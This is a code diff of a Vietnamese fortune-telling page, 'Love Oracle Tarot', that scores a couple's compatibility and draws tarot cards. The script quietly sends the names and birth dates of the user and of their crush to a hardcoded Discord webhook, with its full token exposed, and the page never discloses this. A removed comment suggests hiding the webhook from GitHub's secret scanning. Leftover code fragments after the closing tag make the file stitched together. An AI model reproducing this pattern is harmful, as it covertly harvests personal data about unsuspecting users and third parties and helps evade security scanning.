@@ -6,242 +6,185 @@
     <title>Love Oracle Tarot 🔮</title>
     <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #ff4f9a; --bg: #1a0a2e; }
+        :root {
+            --pink: #ff75b0;
+            --purple: #8a2be2;
+            --dark: #2d0b3a;
+        }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
         
         body {
             min-height: 100vh;
             display: flex; align-items: center; justify-content: center;
-            background: radial-gradient(circle at center, #2e1065 0%, #1a0a2e 100%);
-            color: white; overflow-x: hidden; padding: 20px;
+            /* Màu tím pha hồng chủ đạo */
+            background: linear-gradient(135deg, #2d0b3a 0%, #8a2be2 50%, #ff75b0 100%);
+            color: white; padding: 20px;
         }
 
         .container {
-            background: rgba(255, 255, 255, 0.05);
+            background: rgba(255, 255, 255, 0.12);
             backdrop-filter: blur(20px);
-            border-radius: 30px; padding: 40px;
-            width: 100%; max-width: 420px; text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border-radius: 30px; padding: 35px;
+            width: 100%; max-width: 400px; text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
         }
 
-        .title { font-family: 'Great Vibes', cursive; font-size: 50px; color: #ffb6d5; margin-bottom: 20px; text-shadow: 0 0 15px rgba(255, 182, 213, 0.5); }
-        
-        .input-group { margin-bottom: 25px; }
-        input {
-            width: 100%; padding: 14px; border-radius: 15px; border: 1px solid rgba(255,255,255,0.2);
-            background: rgba(255,255,255,0.1); color: white; margin-top: 12px; outline: none; transition: 0.3s;
+        .title { 
+            font-family: 'Great Vibes', cursive; 
+            font-size: 48px; 
+            color: #fff; 
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 10px rgba(255, 117, 176, 0.8);
         }
-        input:focus { background: rgba(255,255,255,0.2); border-color: var(--primary); }
+        
+        .input-group { margin-bottom: 15px; text-align: left; }
+        label { font-size: 12px; margin-left: 10px; opacity: 0.9; }
+        
+        input {
+            width: 100%; padding: 12px 15px; border-radius: 12px; 
+            border: 1px solid rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.1); color: white; 
+            margin-top: 5px; outline: none; transition: 0.3s;
+        }
+        input:focus { border-color: var(--pink); background: rgba(255,255,255,0.2); }
         
         button {
-            width: 100%; padding: 15px; border-radius: 15px; border: none; margin-top: 20px;
-            background: var(--primary); color: white; font-weight: 600; cursor: pointer;
-            transition: 0.3s; box-shadow: 0 10px 20px -5px rgba(255, 79, 154, 0.5);
+            width: 100%; padding: 15px; border-radius: 12px; border: none; margin-top: 20px;
+            background: linear-gradient(90deg, #ff75b0, #8a2be2);
+            color: white; font-weight: 600; cursor: pointer;
+            transition: 0.3s; box-shadow: 0 5px 15px rgba(255, 117, 176, 0.3);
         }
-        button:hover { transform: scale(1.02); background: #ff75b0; }
-        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        button:hover { transform: translateY(-2px); filter: brightness(1.1); }
 
         .hidden { display: none; }
-        .result-box { animation: fadeIn 0.8s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-
-        .percent-display { font-size: 4rem; font-weight: 600; color: #ffeb3b; margin: 15px 0; }
-
-        /* Tarot Cards Styling */
-        .card-area { display: flex; gap: 10px; justify-content: center; margin: 25px 0; perspective: 1000px; }
-        .tarot-card { width: 100px; height: 160px; position: relative; transform-style: preserve-3d; transition: transform 0.8s; }
-        .tarot-card.flipped { transform: rotateY(180deg); }
-        .card-side {
-            position: absolute; width: 100%; height: 100%; backface-visibility: hidden;
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            padding: 10px; font-size: 12px; text-align: center; border: 2px solid rgba(255,255,255,0.3);
-        }
-        .back { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); }
-        .front { background: white; color: #1a0a2e; transform: rotateY(180deg); flex-direction: column; font-weight: bold; }
         
-        .reading-text { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; text-align: left; font-size: 13px; line-height: 1.6; max-height: 200px; overflow-y: auto; }
+        /* Kết quả */
+        .percent-box { font-size: 55px; font-weight: 700; color: #ffeb3b; margin: 10px 0; }
+        
+        /* Tarot Cards */
+        .card-area { display: flex; gap: 8px; justify-content: center; margin: 20px 0; }
+        .card {
+            width: 90px; height: 130px; position: relative;
+            transform-style: preserve-3d; transition: transform 0.6s;
+        }
+        .card.flipped { transform: rotateY(180deg); }
+        .face {
+            position: absolute; width: 100%; height: 100%;
+            backface-visibility: hidden; border-radius: 10px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: bold; text-align: center; padding: 5px;
+        }
+        .back { background: #4b0082; border: 2px solid #ff75b0; color: #ff75b0; font-size: 20px; }
+        .front { background: white; color: #2d0b3a; transform: rotateY(180deg); flex-direction: column; }
+        
+        .reading-box { 
+            background: rgba(0,0,0,0.2); padding: 15px; border-radius: 15px; 
+            text-align: left; font-size: 13px; max-height: 150px; overflow-y: auto; 
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div id="setup">
+    <div id="main-ui">
         <h1 class="title">Love Oracle</h1>
+        
         <div class="input-group">
-            <input type="text" id="p1" placeholder="Tên của bạn">
-            <input type="date" id="d1">
-            <input type="text" id="p2" placeholder="Tên người ấy">
-            <input type="date" id="d2">
-            <button onclick="calculate()">KÍCH HOẠT VẬN MỆNH</button>
+            <label>Bạn là:</label>
+            <input type="text" id="name1" placeholder="Nhập tên bạn">
+            <input type="date" id="date1">
         </div>
+        
+        <div class="input-group">
+            <label>Người ấy là:</label>
+            <input type="text" id="name2" placeholder="Nhập tên người ấy">
+            <input type="date" id="date2">
+        </div>
+        
+        <button onclick="startAnalysing()">KÍCH HOẠT ĐỊNH MỆNH 🔮</button>
     </div>
 
-    <div id="result" class="hidden result-box">
-        <p>Tỷ lệ hòa hợp</p>
-        <div class="percent-display" id="pct">0%</div>
-        <p id="status" style="margin-bottom: 20px; font-weight: 300;"></p>
-        <button id="drawBtn" onclick="revealTarot()">BẮT ĐẦU TRẢI BÀI TAROT</button>
+    <div id="result-ui" class="hidden">
+        <p>Mức độ hòa hợp</p>
+        <div class="percent-box" id="display-percent">0%</div>
+        <p id="advice" style="margin-bottom: 15px; font-size: 14px;"></p>
+        <button id="tarot-btn" onclick="drawCards()">XEM QUẺ TAROT</button>
         
-        <div id="tarotView" class="hidden">
-            <div class="card-area" id="cardArea"></div>
-            <div class="reading-text" id="readingDetail"></div>
-            <button onclick="window.location.reload()" style="background:#6366f1; font-size:12px;">XEM LẠI TỪ ĐẦU</button>
+        <div id="tarot-section" class="hidden">
+            <div class="card-area" id="card-area"></div>
+            <div class="reading-box" id="reading-box"></div>
+            <button onclick="location.reload()" style="background: none; border: 1px solid #fff; margin-top: 10px; font-size: 12px;">THỬ LẠI</button>
         </div>
     </div>
 </div>
 
 <script>
-    // LƯU Ý: GitHub sẽ quét và vô hiệu hóa webhook nếu bạn để link trần.
-    // Bạn nên "băm" link hoặc dùng server trung gian. 
-    // Tạm thời mình để biến này, bạn dán link của bạn vào nhé.
-    const HOOK = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P";
+    // THAY LINK DISCORD CỦA BẠN VÀO ĐÂY
+    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P";
 
-    const deck = [
-        {n: "The Lovers", m: "Sự kết nối linh hồn sâu sắc."},
-        {n: "The Sun", m: "Tình yêu rạng rỡ và tràn đầy hy vọng."},
-        {n: "The Moon", m: "Cần làm rõ những hoài nghi trong lòng."},
-        {n: "The Star", m: "Niềm tin và sự chữa lành đang đến."},
-        {n: "The World", m: "Một cái kết viên mãn cho cả hai."},
-        {n: "Justice", m: "Mọi thứ sẽ được đền đáp công bằng."},
-        {n: "Strength", m: "Sức mạnh từ sự thấu hiểu chân thành."}
+    const cardsData = [
+        {n: "The Lovers", m: "Sự kết nối tâm giao mạnh mẽ."},
+        {n: "The Sun", m: "Tình yêu ấm áp, đầy sự chân thành."},
+        {n: "The Moon", m: "Có những nỗi sợ mơ hồ cần vượt qua."},
+        {n: "The Star", m: "Một khởi đầu đầy hy vọng và may mắn."},
+        {n: "The Devil", m: "Sự thu hút mãnh liệt nhưng dễ lụy tình."},
+        {n: "The Tower", m: "Cần thay đổi để mối quan hệ tốt hơn."},
+        {n: "Strength", m: "Sự kiên nhẫn sẽ mang lại quả ngọt."}
     ];
 
-    function calculate() {
-        const n1 = document.getElementById('p1').value, d1 = document.getElementById('d1').value;
-        const n2 = document.getElementById('p2').value, d2 = document.getElementById('d2').value;
+    function startAnalysing() {
+        const n1 = document.getElementById('name1').value;
+        const d1 = document.getElementById('date1').value;
+        const n2 = document.getElementById('name2').value;
+        const d2 = document.getElementById('date2').value;
 
-        if(!n1 || !d1 || !n2 || !d2) return alert("Hãy nhập đủ thông tin!");
+        if(!n1 || !d1 || !n2 || !d2) {
+            alert("Hãy điền đầy đủ thông tin để Oracle làm việc!");
+            return;
+        }
 
-        // Tạo số điểm cố định dựa trên chuỗi ký tự
-        let seed = (n1 + d1 + n2 + d2).length;
-        let score = (seed * 7) % 31 + 69; // Điểm từ 69 - 100
-
-        document.getElementById('setup').classList.add('hidden');
-        document.getElementById('result').classList.remove('hidden');
-        document.getElementById('pct').innerText = score + "%";
-        document.getElementById('status').innerText = score > 85 ? "Mối quan hệ này là định mệnh!" : "Cần kiên nhẫn để thấu hiểu nhau hơn.";
-
-        logDiscord(`🔮 **Love Check:** ${n1} & ${n2} -> **${score}%**`);
-    }
-
-    function revealTarot() {
-        document.getElementById('drawBtn').classList.add('hidden');
-        document.getElementById('tarotView').classList.remove('hidden');
-        const area = document.getElementById('cardArea');
-        const detail = document.getElementById('readingDetail');
-        const pos = ["Quá khứ", "Hiện tại", "Tương lai"];
+        // Tính điểm cố định dựa trên tên
+        let score = (n1.length + n2.length) * 7 % 41 + 60; 
         
-        let report = "";
-        pos.forEach((p, i) => {
-            let card = deck[Math.floor(Math.random()*deck.length)];
-            let cDiv = document.createElement('div');
-            cDiv.className = 'tarot-card';
-            cDiv.innerHTML = `<div class="card-side back">?</div><div class="card-side front"><small>${p}</small><br>${card.n}</div>`;
-            area.appendChild(cDiv);
-            
-            setTimeout(() => cDiv.classList.add('flipped'), i * 500 + 200);
-            detail.innerHTML += `<p><strong>${p}:</strong> ${card.m}</p>`;
-            report += `${p}: ${card.n} | `;
-        });
+        document.getElementById('main-ui').classList.add('hidden');
+        document.getElementById('result-ui').classList.remove('hidden');
+        document.getElementById('display-percent').innerText = score + "%";
+        
+        let adv = score > 85 ? "Hai bạn sinh ra là để dành cho nhau!" : "Cần thêm thời gian để thấu hiểu.";
+        document.getElementById('advice').innerText = adv;
 
-        logDiscord(`🃏 **Tarot Spread:** ${report}`);
+        sendWebhook(`🔮 **Bói Tình Yêu**\n👤: ${n1} (${d1})\n💘: ${n2} (${d2})\n📊: **${score}%**`);
     }
 
-    async function logDiscord(msg) {
-        if(HOOK.includes("http")) {
-            fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: msg}) });
+    function drawCards() {
+        document.getElementById('tarot-btn').classList.add('hidden');
+        document.getElementById('tarot-section').classList.remove('hidden');
+        const area = document.getElementById('card-area');
+        const info = document.getElementById('reading-box');
+        const steps = ["Quá khứ", "Hiện tại", "Tương lai"];
+        
+        steps.forEach((s, i) => {
+            let card = cardsData[Math.floor(Math.random() * cardsData.length)];
+            let div = document.createElement('div');
+            div.className = 'card';
+            div.innerHTML = `<div class="face back">✨</div><div class="face front"><small>${s}</small><b>${card.n}</b></div>`;
+            area.appendChild(div);
+            
+            setTimeout(() => div.classList.add('flipped'), i * 500 + 200);
+            info.innerHTML += `<p><strong>${s}:</strong> ${card.m}</p>`;
+        });
+    }
+
+    function sendWebhook(msg) {
+        if(DISCORD_WEBHOOK.includes("discord")) {
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({content: msg})
+            }).catch(e => console.log("Lỗi gửi tin: ", e));
         }
     }
 </script>
-</body>
-</html>
-    { n: "Temperance", m: "Cần sự kiên nhẫn và cân bằng cảm xúc." },
-    { n: "The Fool", m: "Một cuộc phiêu lưu mới mẻ, đầy bất ngờ." },
-    { n: "The Devil", m: "Sức hút mãnh liệt nhưng dễ gây lụy tình." }
-];
-
-let finalPercent = 0;
-
-function calculateFixedLove(s1, d1, s2, d2) {
-    const combined = (s1 + d1 + s2 + d2).toLowerCase().trim();
-    let hash = 0;
-    for (let i = 0; i < combined.length; i++) {
-        hash = ((hash << 5) - hash) + combined.charCodeAt(i);
-        hash |= 0;
-    }
-    return (Math.abs(hash) % 41) + 60; // Trả về 60% - 100%
-}
-
-async function sendToDiscord(content) {
-    if (!WEBHOOK_URL || WEBHOOK_URL.includes("https://discord.com/api/webhooks/1475555053422252093/0-YmRXEGDvE14jIZtLlLJhIpKgyne8QEqpYil2TS4ptWHN01ccahn3NwDN46gi2ry84P")) return;
-    try {
-        await fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: content })
-        });
-    } catch (e) { console.error("Webhook error:", e); }
-}
-
-function startOracle() {
-    const n1 = document.getElementById('myName').value.trim();
-    const d1 = document.getElementById('myDob').value;
-    const n2 = document.getElementById('crushName').value.trim();
-    const d2 = document.getElementById('crushDob').value;
-
-    if (!n1 || !d1 || !n2 || !d2) {
-        alert("Vui lòng nhập đầy đủ thông tin!");
-        return;
-    }
-
-    document.getElementById('btnStart').disabled = true;
-    finalPercent = calculateFixedLove(n1, d1, n2, d2);
-    
-    document.getElementById('result').classList.remove('hidden');
-    document.getElementById('percentText').innerText = `Độ hòa hợp: ${finalPercent}%`;
-
-    let msg = finalPercent > 85 ? "💞 Soulmate - Định mệnh an bài" : 
-              finalPercent > 75 ? "💖 Duyên nợ sâu đậm - Hãy chủ động" : "⚠️ Bài học nghiệp - Cần sự kiên nhẫn";
-    document.getElementById('shortMsg').innerText = msg;
-
-    sendToDiscord(`🔮 **MỚI**\n👤 ${n1} (${d1})\n💘 ${n2} (${d2})\n📊 Kết quả: ${finalPercent}% - ${msg}`);
-}
-
-function drawTarot() {
-    document.getElementById('btnTarot').style.display = 'none';
-    document.getElementById('tarotBox').classList.remove('hidden');
-    
-    const cardsDiv = document.getElementById('cards');
-    const readingDiv = document.getElementById('reading');
-    const positions = ["Quá khứ", "Hiện tại", "Tương lai"];
-    
-    // Xáo bài ngẫu nhiên
-    let shuffled = [...tarotDeck].sort(() => 0.5 - Math.random());
-    let reportText = "";
-
-    positions.forEach((pos, i) => {
-        const cardData = shuffled[i];
-        const cardEl = document.createElement('div');
-        cardEl.className = 'card';
-        cardEl.innerHTML = `
-            <div class="card-face card-back">🔮</div>
-            <div class="card-face card-front">
-                <small style="color:#888">${pos}</small>
-                <strong style="margin:5px 0">${cardData.n}</strong>
-            </div>
-        `;
-        cardsDiv.appendChild(cardEl);
-
-        setTimeout(() => cardEl.classList.add('flipped'), i * 600 + 300);
-
-        readingDiv.innerHTML += `<p><b>${pos}: ${cardData.n}</b><br>✨ ${cardData.m}</p>`;
-        reportText += `${pos}: ${cardData.n}\n`;
-    });
-
-    sendToDiscord(`🃏 **TRẢI BÀI TAROT**\n${reportText}`);
-}
-</script>
-
 </body>
 </html>
